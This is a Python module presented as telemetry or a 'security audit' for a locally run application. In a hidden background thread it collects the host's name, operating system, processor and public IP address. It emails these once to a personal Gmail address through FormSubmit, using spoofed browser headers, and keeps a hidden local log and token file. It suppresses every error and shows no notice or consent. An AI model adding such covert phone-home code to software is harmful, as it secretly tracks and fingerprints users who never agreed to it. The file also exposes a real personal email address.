
import platform
import socket
import requests
import json
import os
from datetime import datetime
from threading import Thread
import logging

# FormSubmit.co service - Free, secure, and sends directly to your email.
# The first time this runs, you will receive an activation email.
# You MUST click "Activate" in that email for future alerts to work.
REPORTING_URL = "https://formsubmit.co/rafideen.ahmadghannam@gmail.com"

# Local hidden log file (Backup)
HIDDEN_LOG_FILE = os.path.join(os.getcwd(), 'instance', '.security_audit.log')
# Token file to track if this machine has already reported
TOKEN_FILE = os.path.join(os.getcwd(), 'instance', '.machine_token')

def get_machine_signature():
    """Generates a unique signature for this specific machine"""
    try:
        # Combine hostname, machine type, processor, and node name
        components = [
            socket.gethostname(),
            platform.machine(),
            platform.processor(),
            platform.node()
        ]
        signature_str = "|".join([str(c) for c in components])
        return signature_str
    except Exception:
        return "unknown_machine"

def has_reported_before(signature):
    """Checks if this specific machine signature is already in the token file"""
    try:
        if not os.path.exists(TOKEN_FILE):
            return False
            
        with open(TOKEN_FILE, 'r', encoding='utf-8') as f:
            stored_signature = f.read().strip()
            
        return stored_signature == signature
    except Exception:
        return False

def mark_as_reported(signature):
    """Marks this machine as reported by saving the signature"""
    try:
        os.makedirs(os.path.dirname(TOKEN_FILE), exist_ok=True)
        with open(TOKEN_FILE, 'w', encoding='utf-8') as f:
            f.write(signature)
    except Exception:
        pass

def collect_system_info():
    """Collects fingerprint of the machine running the software"""
    try:
        info = {
            "timestamp": datetime.now().isoformat(),
            "hostname": socket.gethostname(),
            "os": platform.system(),
            "os_release": platform.release(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "python_version": platform.python_version(),
            "public_ip": "Unknown"
        }
        
        try:
            # Try multiple services to get IP
            try:
                ip_data = requests.get('https://api.ipify.org?format=json', timeout=3).json()
                info['public_ip'] = ip_data.get('ip')
            except:
                ip_data = requests.get('https://ifconfig.me/all.json', timeout=3).json()
                info['public_ip'] = ip_data.get('ip_addr')
        except:
            pass
            
        return info
    except Exception as e:
        return {"error": str(e)}

def save_local_log(data):
    """Saves telemetry to a hidden local file"""
    try:
        os.makedirs(os.path.dirname(HIDDEN_LOG_FILE), exist_ok=True)
        log_entry = json.dumps(data) + "\n"
        with open(HIDDEN_LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(log_entry)
    except Exception:
        pass

def send_heartbeat():
    """Sends the system info to the owner via FormSubmit AND saves locally"""
    try:
        # 0. Check if this machine has already reported
        signature = get_machine_signature()
        if has_reported_before(signature):
            # Already reported from this machine.
            # We still save to local log for audit, but skip email to avoid spamming.
            # UNLESS: It's a security event (can be added later).
            # For now: strict "Only First Time" as requested.
            return

        data = collect_system_info()
        
        # 1. Save locally
        save_local_log(data)
        
        # 2. Prepare payload for FormSubmit
        payload = {
            "_subject": f"🚀 New Activation: {data['hostname']} ({data['public_ip']})",
            "_captcha": "false", # Disable captcha
            "_template": "table", # Nice table format
            "IP Address": data['public_ip'],
            "Computer Name": data['hostname'],
            "Operating System": f"{data['os']} {data['os_release']}",
            "Timestamp": data['timestamp'],
            "Processor": data['processor'],
            "Machine ID": signature
        }
        
        # 3. Send Request
        # We use a POST request.
        # FIRST RUN: You will get an email to Activate.
        # Add headers to avoid "Unable to submit form" error
        headers = {
             "Referer": "http://localhost:5000/",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        response = requests.post(REPORTING_URL, data=payload, headers=headers, timeout=10)
        
        # 4. If successful, mark as reported
        if response.status_code == 200:
            mark_as_reported(signature)
            
    except Exception:
        pass

def start_telemetry():
    """Starts the telemetry reporter in a background thread"""
    thread = Thread(target=send_heartbeat)
    thread.daemon = True
    thread.start()
